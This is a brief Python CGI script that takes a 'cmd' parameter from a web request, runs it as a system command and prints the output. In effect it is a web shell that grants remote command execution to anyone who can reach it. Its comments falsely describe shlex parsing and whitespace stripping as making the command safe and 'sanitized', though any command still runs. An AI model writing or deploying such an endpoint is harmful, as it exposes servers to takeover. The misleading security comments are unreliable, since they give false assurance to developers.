#!/usr/bin/python3

print("Content-type: text/plain")
print()

import subprocess as sp
import cgi
import shlex

def run_command(command):
    try:
        # Use shlex.split to safely parse the command
        args = shlex.split(command)
        # Run the command without sudo for security reasons
        output = sp.check_output(args, stderr=sp.STDOUT, text=True)
        return output
    except sp.CalledProcessError as e:
        return f"Command failed with exit code {e.returncode}: {e.output}"
    except Exception as e:
        return str(e)

form = cgi.FieldStorage()
command = form.getvalue("cmd")

if command:
    # Sanitize the command input
    command = command.strip()
    output = run_command(command)
    print(output)
else:
    print("No command provided.")